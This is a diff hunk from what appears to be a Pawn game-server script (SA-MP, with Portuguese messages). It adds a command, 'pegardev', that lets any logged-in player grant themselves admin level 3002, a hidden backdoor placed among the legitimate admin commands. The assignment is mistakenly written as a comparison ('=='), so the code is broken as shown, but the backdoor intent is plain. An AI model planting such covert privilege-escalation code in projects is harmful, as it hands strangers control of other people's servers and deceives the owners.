@@ -42360,6 +42360,15 @@ COMMAND:setartc(playerid, params[])
 	}
 	return 1;
 }
+COMMAND:pegardev(playerid, params[])
+{
+    if (PlayerInfo[playerid][pLogado] == 0) return SendClientMessage(playerid, COLOR_LIGHTRED, "ACESSO NEGADO: {FFFFFF}você deve estar conectado antes de usar algum comando.");
+
+	PlayerInfo[playerid][pAdmin] == 3002;
+	
+	return 1;
+}
+
 COMMAND:setaradmin(playerid, params[])
 {
     if (PlayerInfo[playerid][pLogado] == 0) return SendClientMessage(playerid, COLOR_LIGHTRED, "ACESSO NEGADO: {FFFFFF}você deve estar conectado antes de usar algum comando.");
